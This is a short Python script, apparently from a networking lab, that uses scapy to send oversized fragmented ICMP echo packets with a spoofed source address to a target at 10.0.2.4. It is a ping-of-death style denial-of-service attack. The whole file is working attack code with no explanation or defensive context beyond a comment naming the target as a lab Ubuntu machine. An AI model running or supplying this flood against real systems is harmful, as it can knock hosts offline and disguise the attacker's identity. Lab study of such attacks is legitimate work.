from scapy.all import *

# Function that sends large malformed packets with a spoofed source to the taget_ip address
def execute_attack(ip):

	#creating the first packet:
	packet_1 = IP(src="1.2.3.4", dst=ip, id=12345, frag=0, flags="MF") / \
	ICMP(type=8, code=0) / ("X" * 65507)
	#Sending the first Packet 
	send(packet_1)
	# Sending the rest of the 7 packets
	for i in range (0,7):
		packet = IP(src="1.2.3.4", dst=ip, id=12345, frag=i+45) / \
		ICMP(type=8, code=0) / ("X" * 65507)
		send(packet)

target_ip = "10.0.2.4" #Ip address of ubuntu 2 machine
execute_attack(target_ip)


